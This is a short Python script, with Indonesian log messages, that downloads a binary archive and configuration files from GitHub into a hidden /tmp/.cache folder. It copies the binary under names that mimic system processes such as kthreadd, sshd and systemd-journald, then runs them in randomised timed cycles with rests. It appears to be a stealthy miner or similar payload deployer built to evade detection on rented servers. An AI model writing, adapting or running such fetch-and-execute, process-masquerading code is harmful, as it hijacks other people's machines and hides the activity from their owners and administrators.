import os
import urllib.request
import tarfile
import shutil
import time
import subprocess
import random

base_path = "/tmp/.cache"
binary_names = ["kthreadd.", "systemd-journald.", "sshd.", "httpd."]
config_links = [
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-1.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-2.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-1.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-3.ini",
]
payload_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"

def setup_folders():
    print("[Poppy] Siapin tempat kerja dan unduh alat panen...")
    os.makedirs(base_path, exist_ok=True)

    archive_path = os.path.join(base_path, "cache.tar.gz")
    if not os.path.exists(os.path.join(base_path, "cache")):
        print("[Poppy] Mengunduh cache.tar.gz...")
        urllib.request.urlretrieve(payload_url, archive_path)

        print("[Poppy] Mengekstrak alat panen...")
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(base_path)

        os.remove(archive_path)

    for i in range(4):
        folder = os.path.join(base_path, str(i + 1))
        os.makedirs(folder, exist_ok=True)

        bin_src = os.path.join(base_path, "cache")
        bin_dst = os.path.join(folder, binary_names[i])
        shutil.copy2(bin_src, bin_dst)
        os.chmod(bin_dst, 0o755)

        config_path = os.path.join(folder, "config.ini")
        if not os.path.exists(config_path):
            print(f"[Poppy] Mengunduh pengaturan panen {i+1}...")
            urllib.request.urlretrieve(config_links[i], config_path)

    try:
        os.remove(os.path.join(base_path, "cache"))
    except FileNotFoundError:
        pass

def run_random():
    print("[Poppy] Mulai kerja acak panen...")
    random.seed(time.time() + os.getpid())  # Seed unik biar tiap VPS beda

    max_loop = 10
    run_duration = 15 * 60
    rest_duration = 2 * 60
    long_rest = 5 * 60

    while True:
        for loop in range(max_loop):
            index = random.randint(0, 3)
            folder = os.path.join(base_path, str(index + 1))
            binary = os.path.join(folder, binary_names[index])

            print(f"[Poppy] [{loop+1}/{max_loop}] Menjalankan: {binary}")
            proc = subprocess.Popen(binary, cwd=folder)

            time.sleep(run_duration)

            print("[Poppy] Menghentikan proses panen...")
            subprocess.run(f"pkill -f {binary_names[index]}", shell=True)
            time.sleep(rest_duration)

        print("[Poppy] Istirahat panjang 5 menit...")
        for b in binary_names:
            subprocess.run(f"pkill -f {b}", shell=True)
        time.sleep(long_rest)

# Jalankan semua proses
setup_folders()
run_random()
